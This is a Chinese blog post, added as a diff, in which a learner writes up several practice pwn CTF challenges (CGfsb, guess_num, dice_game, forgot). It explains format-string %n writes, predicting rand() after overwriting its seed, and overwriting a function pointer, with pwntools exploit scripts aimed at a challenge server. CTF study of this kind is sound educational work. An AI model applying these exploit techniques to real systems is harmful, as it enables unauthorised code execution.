@@ -1,0 +1,115 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="for study"><title>drops做题收获 | try</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">drops做题收获</h1><a id="logo" href="/.">try</a><p class="description">go</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">drops做题收获</h1><div class="post-meta">Aug 8, 2019</div><div class="post-content"><a id="more"></a>
+
+
+
+
+<p>攻防世界 </p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p>
+<p>分析伪代码，发现修改pwnme的值为8 得到flag</p>
+<p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p>
+<p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p>
+<p><strong>用法说明</strong></p>
+<pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址
+位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p>
+<p>一<br><img src="/2019/08/08/p/2.png" alt><br>利用%x泄露内容</p>
+<p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p>
+<p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p>
+<p>二<br><img src="/2019/08/08/p/1.jpg" alt><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p>
+<p>所以说偏移处指针会不会是指</p>
+<pre><code>猜测。。。。
+原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p>
+<p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p>
+<pre><code> from pwn import *
+p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);
+
+pwnme=0x804a068
+p.recvuntil(&apos;name:&apos;)
+p.sendline(&apos;qqqq&apos;)
+p.recvuntil(&apos;please:&apos;)
+payload = p32(pwnme)
+payload += &apos;aaaa&apos;
+payload += &apos;%10$n&apos;
+p.sendline(payload)
+p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p>
+<p><img src="/2019/08/08/p/3.png" alt></p>
+<p>开启了canary,不能直接栈溢出到sub_C3E函数，</p>
+<p>但是区别在于</p>
+<p>一</p>
+<pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，
+而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]
+所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p>
+<pre><code>guess_num 没给libc库， dice_game给了libc.so.6
+所以写脚本时
+guess_num用的是
+libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+而dice_game用的是
+libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p>
+<pre><code>srand初始化随机种子,rand产生随机数。
+随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，
+实际上是一段数字的循环，这些数字取决于随机种子。
+在调用rand()函数时，必须先利用srand()设好随机数种子，
+如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p>
+<p>下面是从</p>
+<p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p>
+<pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，
+即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。
+
+Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)
+
+Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p>
+<p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p>
+<p>脚本</p>
+<pre><code>from pwn import *
+from ctypes import *
+#coding:utf-8
+p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)
+libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+payload = &quot;a&quot;*0x20 +p64(1)
+p.recvuntil(&apos;Your name:&apos;)
+p.sendline(payload)
+libc.srand(1)
+for i in range(10):
+num = str(libc.rand()%6+1)
+p.recvuntil(&apos;number:&apos;)
+p.sendline(num)
+
+p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p>
+<p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p>
+<p>记下函数的地址。</p>
+<p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p>
+<p>搜到的题解</p>
+<pre><code>#! /usr/bin/env python
+from pwn import *
+p=remote(&apos;111.198.29.45&apos;,56015)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(&apos;A&apos;)
+payload=&apos;A&apos;*32+p32(0x080486cc)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload)
+print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p>
+<p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p>
+<p><img src="/2019/08/08/p/4.png" alt></p>
+<p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p>
+<p><img src="/2019/08/08/p/5.png" alt></p>
+<p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p>
+<p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p>
+<p>为什么呢？<br>我也不太清楚。</p>
+<p>下面是为什么用32*”A”的原因</p>
+<p>重点</p>
+<h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据
+所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数
+因此我们可以用这一句来进行溢出，执行我们找到的 后门函数
+分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数
+可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p>
+<p>因此我用下面的脚本验证发现也可行</p>
+<pre><code>#coding:utf-8
+from pwn import *
+
+p=remote(&apos;111.198.29.45&apos;,39341)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(&apos;A&apos;)
+payload=&apos;9&apos;*36+p32(0x080486cc)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload)
+print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
+</div><div class="tags"><a href="/tags/做题题解/">做题题解</a></div><div class="post-nav"><a class="pre" href="/2019/08/08/level0/">level0</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"><input type="hidden" name="si" value="http://yoursite.com"><input name="tn" type="hidden" value="bds"><input name="cl" type="hidden" value="3"><input name="ct" type="hidden" value="2097152"><input name="s" type="hidden" value="on"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Kategorien</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/保护机制/" style="font-size: 15px;">保护机制</a> <a href="/tags/做题题解/" style="font-size: 15px;">做题题解</a> <a href="/tags/语言基础/" style="font-size: 15px;">语言基础</a> <a href="/tags/有关栈/" style="font-size: 15px;">有关栈</a> <a href="/tags/计算机基础概念/" style="font-size: 15px;">计算机基础概念</a> <a href="/tags/虚拟机配置/" style="font-size: 15px;">虚拟机配置</a> <a href="/tags/pwn学习/" style="font-size: 15px;">pwn学习</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Letzte</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/04/share/">share</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/15/虚拟机配置/">虚拟机配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/08/canary/">canary</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/05/链接/">链接</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/通用gadget原理分析/">通用gadget原理分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/stack2/">stack2</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/ubuntu16-04配置/">ubuntu16.04配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/09/shell/">shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/27/stack_explain/">stack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/python/">python基本数据类型</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Blogroll</i></div><ul></ul><a href="https://nocbtm.github.io/learn/" title="jing" target="_blank">jing</a><ul></ul><a href="http://www.example2.com/" target="_blank"></a><ul></ul><a href="http://www.example3.com/" target="_blank"></a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">try.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
